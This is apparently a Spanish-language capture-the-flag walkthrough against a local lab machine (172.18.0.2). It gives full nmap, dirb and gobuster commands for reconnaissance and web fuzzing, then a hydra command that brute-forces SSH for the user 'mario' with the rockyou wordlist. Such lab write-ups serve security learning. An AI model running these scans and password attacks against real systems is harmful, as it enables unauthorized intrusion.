


Habilitamos la maquina y nos entrega su io -> 172.18.0.2<br>

<img width="918" height="174" alt="image" src="https://github.com/user-attachments/assets/52b50d19-4258-4e06-861b-8e3459fc4be9" /><br>

Reconocimiento
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.18.0.2<br>
<img width="885" height="551" alt="image" src="https://github.com/user-attachments/assets/c722cee0-4293-4cab-8cb7-1080ffe2f371" /><br>

Identificamos 2 puertos el 22 y el 80<br>

<img width="1343" height="548" alt="image" src="https://github.com/user-attachments/assets/5aff5cb6-c25e-45b0-b458-360a28e0bb08" /><br>

<img width="1303" height="532" alt="image" src="https://github.com/user-attachments/assets/22c0e376-3d17-4d7f-82e5-c524a03dbdd4" /><br>


Realizar Fuzzing Web mediante Herramienta Dirb <br>
<img width="520" height="370" alt="image" src="https://github.com/user-attachments/assets/e4a4a52e-ff5a-48c3-8ef1-b1231307b11d" /><br>

Tambien probamos con Gobuster con los parametros  -x con extensiones para encontrar archivos que nos puedan servir<br>

obuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,sh,py  <br>
<img width="1062" height="403" alt="image" src="https://github.com/user-attachments/assets/7537c149-02a0-4da0-a4dd-8280d7067605" /> <br>

Encontraremos un recurso llamado  /secret.php la cual adjuntamos a nuestro sitio  <br>
<img width="874" height="531" alt="image" src="https://github.com/user-attachments/assets/83ac4623-ffaa-483c-8b14-bc33c834a5ad" /> <br>

Como dato sabemos que hay un usuario que se llama mario, por lo cual lo usaremos para encontrar su clave mediante un ataque hydra al puerto ssh <br>
hydra -l mario -P /home/kali/rockyou.txt ssh://172.18.0.2 -t 64  <br>

<img width="1337" height="259" alt="image" src="https://github.com/user-attachments/assets/6cdd5879-e271-48d5-be4c-c384d1696779" />  <br>


